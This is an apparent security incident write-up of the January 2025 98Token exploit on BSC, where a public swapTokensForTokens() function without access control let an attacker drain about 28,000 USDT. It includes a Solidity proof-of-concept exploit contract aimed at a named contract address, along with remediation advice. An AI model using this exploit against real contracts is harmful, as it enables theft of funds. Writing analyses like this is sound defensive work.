# 98Token — Analysis of Public Swap Function Without Access Control

| Field | Details |
|------|------|
| **Date** | 2025-01-07 |
| **Protocol** | 98Token |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$28,000 USDT |
| **Attacker** | [Unidentified](https://bscscan.com/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [0x61da5b50...](https://bscscan.com/tx/0x61da5b502a62d7e9038d73e31ceb3935050430a7f9b7e29b9b3200db3095f91d) |
| **Vulnerable Contract** | [0xB040D88e...](https://bscscan.com/address/0xB040D88e61EA79a1289507d56938a6AD9955349C) |
| **Root Cause** | `swapTokensForTokens()` has no access control, allowing anyone to swap tokens held by the contract |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/98Token_exp.sol) |

---

## 1. Vulnerability Overview

The 98Token swap contract (`0xB040D88e...`) declared `swapTokensForTokens()` as `public` with no caller validation logic whatsoever. The attacker directly called this function to swap the contract's entire 98Token balance into USDT, setting the recipient address to the attacker's own address, thereby stealing 28,000 USDT.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: swap function callable by anyone
function swapTokensForTokens(
    address[] calldata path,   // swap path (token_98 → USDT)
    uint256 amountIn,          // entire contract balance
    uint256 amountOutMin,      // 0 (no slippage protection)
    address recipient          // can be set to attacker's address
) public {  // ← no access control
    IERC20(path[0]).approve(router, amountIn);
    IRouter(router).swapExactTokensForTokens(
        amountIn, amountOutMin, path, recipient, block.timestamp
    );
}

// ✅ Safe code: only owner can call
function swapTokensForTokens(...) external onlyOwner {
    // same logic as above
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: 98Token_decompiled.sol
contract 98Token {
    function swapTokensForTokens(address[] a, uint256 b, uint256 c, address d) external returns (address) {  // ❌ vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Check token_98 balance held by vulnerable contract
  │
  ├─→ [2] Directly call swapTokensForTokens()
  │         ├─ path: [token_98, USDT]
  │         ├─ amountIn: entire contract balance
  │         ├─ amountOutMin: 0
  │         └─ recipient: attacker's address
  │
  ├─→ [3] Execute token_98 → USDT swap from contract holdings
  │
  └─→ [4] Receive 28,000 USDT
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract Exploit {
    address constant SWAP_CONTRACT = 0xB040D88e61EA79a1289507d56938a6AD9955349C;
    address constant TOKEN_98 = /* token_98 address */;
    address constant USDT = /* USDT address */;

    function exploit() external {
        // [1] Query token_98 balance of the vulnerable contract
        uint256 balance = IERC20(TOKEN_98).balanceOf(SWAP_CONTRACT);

        // [2] Directly call the function with no access control
        //     Set recipient to attacker (msg.sender)
        address[] memory path = new address[](2);
        path[0] = TOKEN_98;
        path[1] = USDT;

        ISwapContract(SWAP_CONTRACT).swapTokensForTokens(
            path,
            balance,    // drain entire balance
            0,          // no slippage protection
            msg.sender  // attacker receives funds
        );
        // Result: 28,000 USDT obtained
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct function call) |
| **DApp Category** | Token swap contract |
| **Impact** | Complete drain of contract-held assets |

## 6. Remediation Recommendations

1. **Add Access Control**: Apply `onlyOwner` or role-based access control (RBAC) to the swap function
2. **Fix Recipient**: Hardcode the `recipient` parameter as an internal constant so it cannot be specified externally
3. **Slippage Protection**: Block calls that set `amountOutMin` to 0 (enforce a minimum expected output)
4. **Function Visibility Audit**: Review all `public` functions and change any that do not require external access to `internal` or `private`

## 7. Lessons Learned

- Every function that moves assets in a smart contract must have strict access control.
- `public` visibility permits unintended external calls — this is one of the most fundamental yet devastating security vulnerabilities.
- During development, always ask: "Is there a reason for this function to be called externally?"
- Allowing zero slippage by design can cause additional losses when combined with MEV attacks.